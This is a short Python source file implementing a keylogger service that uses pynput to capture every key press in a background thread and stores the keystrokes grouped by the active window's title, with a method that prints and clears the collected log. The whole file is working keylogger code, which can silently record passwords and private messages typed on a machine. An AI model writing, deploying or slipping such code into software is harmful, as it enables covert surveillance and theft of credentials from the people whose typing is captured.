from pynput import keyboard
from IKeyLoggerService import IKeloggerService
import pygetwindow as gw
import threading
import time

class KeyLoggerService(IKeloggerService):

    storage = {}

    def on_press(self, key):
        try:
            formated = format(key.char)
        except:
            formated = format(key)
        current_screen = gw.getActiveWindow().title
        if current_screen not in KeyLoggerService.storage:
            KeyLoggerService.storage[current_screen] = []
        KeyLoggerService.storage[current_screen].append(formated)

    @property
    def start(self):
        def collect():
            with keyboard.Listener(
                on_press=self.on_press
            ) as listener:
                listener.join()
        collector = threading.Thread(target=collect)
        collector.start()

    @property
    def stop(self):
        pass

    @property
    def get(self):
        print(KeyLoggerService.storage)
        KeyLoggerService.storage = {}